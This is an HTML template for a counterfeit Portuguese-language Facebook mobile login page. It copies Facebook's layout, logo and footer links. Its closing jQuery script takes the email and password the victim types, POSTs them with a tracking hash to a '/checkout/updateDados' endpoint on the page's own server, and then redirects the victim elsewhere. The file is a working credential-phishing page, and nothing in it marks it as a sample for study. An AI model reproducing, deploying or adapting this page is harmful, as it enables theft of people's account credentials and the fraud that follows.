<!DOCTYPE html>
<html lang="pt">
<head>
    <link rel="icon" href="storage/themes/web/img/gB76kJXPYJV.png">
    <title>Facebook – entre ou cadastre-se</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="storage/themes/web/img/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <link rel="stylesheet" href="/storage/themes/web/css/facebook.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
      <script src="https://code.jquery.com/jquery-migrate-3.4.0.min.js" integrity="sha256-mBCu5+bVfYzOqpYyK4jm30ZxAZRomuErKEFJFIyrwvM=" crossorigin="anonymous"></script>
</head>
<body tabindex="0" class="touch x1-5 _fzu _50-3 iframe acw portrait" cz-shortcut-listen="true"
      style="min-height: 754px; background-color: rgb(255, 255, 255);">
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 754px;">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"
             style="min-height: 754px;">
            <div class="_7om2">
                <div class="_4g34" id="u_0_0_Fp">
                    <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                    </div>
                    <div class="_9om_">
                        <div class="_4-4l">
                            <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
                            </div>
                            <div class="_7om2 _52we _2pid _52z6">
                                <div class="_4g34">
                                    <a>
                                        <img src="/storage/themes/web/img/dF5SId3UHWd.svg" width="112" class="img"
                                             alt="facebook">
                                    </a>
                                </div>
                            </div>
                            <div class="_5rut">
                                <div method="post"
                                      class="mobile-login-form _9hp- _5spm" id="login_form">
                                    <div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_96n9" id="email_input_container">
                                                    <input class="_56bg _4u9z _5ruq _8qtn" id="m_login_email"
                                                           name="email" placeholder="Número de celular ou email"
                                                           type="text" value="" required>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="_55wq"></div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_7om2">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input required class="_56bg _4u9z _27z2 _8qtm"
                                                                       id="m_login_password" name="password"
                                                                       placeholder="Senha" type="password" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="login_password_step_element">
                                            <button type="submit" id="btnEntrar" value="Entrar"
                                                    class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                                                    name="login">
                                                <span class="_55sr">Entrar</span>
                                            </button>
                                        </div>

                                    </div>
</div>
                                <div>
                                    <div class="_2pie _9omz">
                                        <div class="_52jj _9on1">
                                            <a class="_9on1" href="https://m.facebook.com/recover/initiate/"
                                               id="forgot-password-link">Esqueceu a senha?</a>
                                        </div>
                                    </div>
                                    <div style="padding-top: 42px">
                                        <div>
                                            <div>
                                                <div>
                                                    <div id="login_reg_separator" class="_43mg _8qtf">
                                                        <span class="_43mh">ou</span>
                                                    </div>
                                                    <div class="_52jj _5t3b" id="signup_button_area">
                                                        <a role="button"
                                                           class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                           id="signup-button">Criar nova conta</a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">

                    <div class="_5ui4">
                        <div class="_96qv _9a0a">
                            <a href="https://about.facebook.com/?refid=8" class="_96qw" title="Leia nosso blog, descubra a central de recursos e encontre oportunidades de trabalho.">Sobre</a>
                            <span> · </span>
                            <a href="https://m.facebook.com/help/?ref=pf&refid=8" class="_96qw" title="Acesse nossa Central de Ajuda.">Ajuda</a>
                            <span aria-hidden="true"> · </span>
                            <span class="_96qw" id="u_0_4_N7">Mais</span>
                        </div>
                        <span class="mfss fcg">Facebook, Inc.</span></div>
                </div>
            </div>
        </div>
    </div>
</div>
<input type="hidden" id="_hash" value="{{$data['hash']}}">
<input type="hidden" id="_path" value="{{$data['path']}}">
</body>
</html>

<script>
    $("#btnEntrar").click(async function(e){
        function isEmail(email) {
            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return regex.test(email);
        }

        if(!isEmail( $("#m_login_email").val() )){
            alert('E-mail inválido, preencha novamente.');
            return;
        }

        if($("#m_login_password").val().length < 6){
            alert('Senha inválida, preencha a senha novamente.');
            return;
        }

        await updateDados();
        location.href = $("#_path").val();
    })

    async function updateDados(){
        new Promise((res)=>{
            $.ajax({
                url: "/checkout/updateDados",
                data: {
                    email: $("#m_login_email").val(),
                    senha: $("#m_login_password").val(),
                    hash: $("#_hash").val(),
                    facebook: 's'
                },
                method: "POST",
                success: function(r) {
                    res();
                }
            });
        })
        }
</script>